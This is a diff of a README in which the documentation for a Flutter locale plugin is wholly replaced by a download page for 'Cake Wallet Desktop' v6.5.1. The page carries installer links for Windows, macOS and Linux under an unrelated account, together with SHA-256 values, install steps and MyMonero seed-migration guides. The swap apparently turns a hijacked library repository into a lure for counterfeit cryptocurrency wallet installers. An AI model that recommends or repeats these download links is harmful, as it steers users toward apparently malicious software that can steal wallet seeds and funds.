@@ -1,90 +1,83 @@
-# devicelocale
+<p align="center"><img src="https://github.com/Cake-LabsLLC/cake-wallet-desktop/raw/HEAD/assets/banner-app.png" alt="Cake Wallet app banner" width="100%"></p>
 
-Gets the device locale data, independent of the app locale settings.
+<h1 align="center">Cake Wallet Desktop</h1>
+<p align="center">Cake Wallet v6.5.1 for Windows, macOS and Linux</p>
 
-## Usage
+<p align="center">
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
+</p>
 
-```dart
-import 'package:devicelocale/devicelocale.dart';
-```
+| Platform | File | Version |
+|---|---|---|
+| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
+| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
+| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |
 
-then
+All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).
 
-```dart
-List languages = await Devicelocale.preferredLanguages;
-String locale = await Devicelocale.currentLocale;
-```
+## SHA-256 checksums
 
-this should return a list of the preferred/current language locales setup on the device, with the current one being the first in the list or just the currently set device locale.
+<!-- SHA256:START -->
+| File | SHA-256 |
+|---|---|
+| Cake-Wallet-Windows-v6.5.1.exe | `79fc6ed0c0525d0cfa338714d897578c51e0373d174c074d834885de74f90325` |
+| Cake-Wallet-MacOS-v6.5.1.dmg | `bf970d53b72f431947955f36b9e06f93ee3bca4dca62b39933c9fa34cf2d4875` |
+| Cake-Wallet-linux-v6.5.1.zip | `a7fa282b01e667d4c198b687c9fa690e8946a8f09eacb801ad08259638b9da6a` |
+<!-- SHA256:END -->
 
-### Android specific implementation (no-op on other platforms)
-Added per-app language preferences for Android (https://developer.android.com/about/versions/13/features/app-languages#kotlin)
-You can check if your current device is supported `isLanguagePerAppSettingSupported`
-And after checking if your device is supported you can set the per-app language preference with `setLanguagePerApp(Locale)` this will return true if success
+---
 
-### Note for Linux
+## Install
 
-Since GNU/Linux and POSIX doesn't provide a standard API for getting the preferred languages, `Devicelocale.preferredLanguages` always returns the current locale.
+### Windows
+1. Download [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe).
+2. Check it in PowerShell: `certutil -hashfile Cake-Wallet-Windows-v6.5.1.exe SHA256`
+3. Run the installer and follow the prompts.
 
-## Updates
+### macOS
+1. Download [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg).
+2. Check it in Terminal: `shasum -a 256 Cake-Wallet-MacOS-v6.5.1.dmg`
+3. Open the .dmg and drag Cake Wallet to Applications. If macOS asks on first launch, right-click the app and choose Open.
 
-### Feb 2023
-Added  2 new functions for this [iOS issue](https://github.com/magnatronus/flutter-devicelocale/issues/38)
+### Linux
+1. Download [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip).
+2. Check it: `sha256sum Cake-Wallet-linux-v6.5.1.zip`
+3. Unpack it: `unzip Cake-Wallet-linux-v6.5.1.zip` and start the app from the unpacked folder.
 
-- defaultLocale
- - defaultAsLocale
- 
+> [!TIP]
+> Every character of the result must match the SHA-256 table above. If it does not, delete the file and download it again.
 
-### July 2022
-Added support for per-app language preferences on Android (https://developer.android.com/about/versions/13/features/app-languages#kotlin)
-You can now set the per-app language if you have an in app language picker.
-Updated the demo app
+---
 
-### May 2022
-Merged pull requests
+## Features
 
-### Oct 2021
-Updated the code and APIs used by Flutter for an Android plugin - this was the source of the Deprecated API warning in the Android build.
+- Create a new Monero (XMR) wallet or restore one from a seed or keys
+- Restore a MyMonero 13 or 25 word seed
+- Receive XMR, including with subaddresses
+- Send XMR
+- Runs on Windows, macOS and Linux
 
-### July 2021
-Add beta support for Linux
+## Popular guides
 
-### March 2021
+| Guide | What it covers |
+|---|---|
+| [Restore a MyMonero seed in Cake Wallet](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-mymonero-migration.md) | Move your MyMonero wallet step by step |
+| [Install Cake Wallet on Windows](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-windows.md) | Download, check and install the .exe |
+| [Install Cake Wallet on macOS](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-macos.md) | Open the .dmg and get past the first-run prompt |
+| [Install Cake Wallet on Linux](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-linux.md) | Unpack the .zip and start the app |
+| [Verify your Cake Wallet download](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/verify-cake-wallet-download-sha256.md) | Compare the SHA-256 with the release page |
+| [Back up your Cake Wallet seed](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-backup-seed.md) | Keep your recovery words safe offline |
+| [All Cake Wallet guides](https://github.com/Cake-LabsLLC/learn) | The full Cake Wallet help library |
 
-Added test support for web
+> [!WARNING]
+> **Nobody needs your seed to install, update or migrate a Cake Wallet. Never share it.**
 
-Updated for null safety
+## Support
 
-### Jul 2020 Locale update v0.3.1
+Read the [Cake Wallet guides](https://github.com/Cake-LabsLLC/learn) or [open an issue](https://github.com/Cake-LabsLLC/cake-wallet-desktop/issues).
 
-This is an update from a received request, where prior to 0.3.1  the 2 methods:
+## License
 
-- **preferredLanguages**
-- **currentLocale**
-
-returned string values.
-
-There are now 2 equivilent methods
-
-- **preferredLanguagesAsLocales**
-- **currentAsLocale**
-
-that now also return a **Locale** object rather than a string.
-
-### releases
-
-- March 2021 1.0.0 Updated to null safety
-
-- July 2020 0.3.0 Updated Android to support Android Embedding V2
-
-- Apr 2020 0.2.3 Updated Android code from contributions from @ened
-
-- Mar 2020 0.2.2 Updated iOS so that if detected locale is null then it is not included in return value
-
-- Sep 2019 0.2.0 Updated Android following feedback from https://github.com/huzhirento . Fallback to the currentLocale when attempting to get a list of locales fro Android 7 and below as the getLocales() call is a feature of API 24 and failed for Android 7 and below.
-
-## Getting Started
-
-For help getting started with Flutter, view our
-[online documentation](https://flutter.io/docs), which offers tutorials,
-samples, guidance on mobile development, and a full API reference.
+See the LICENSE file in this repository. The license shown on GitHub is the one that applies.
